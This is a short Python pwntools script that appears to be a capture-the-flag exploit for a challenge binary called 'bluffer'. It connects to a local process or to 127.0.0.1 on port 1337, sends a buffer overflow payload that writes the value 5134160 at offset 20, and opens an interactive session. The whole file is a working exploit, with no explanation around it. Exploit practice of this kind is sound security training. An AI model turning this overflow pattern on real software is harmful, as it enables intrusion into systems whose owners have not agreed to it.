from pwn import *

elf = context.binary = ELF("../src/blufferoverflow/bluffer", checksec=False)

def conn():
    if args.REMOTE:
        p = remote("127.0.0.1", 1337)
    else:
        p = process(elf.path)
    return p

p = conn()


offset = 20

payload = flat({
	offset : [
		5134160
	]
})

p.recvuntil(b": ")

p.sendline(payload)

p.interactive()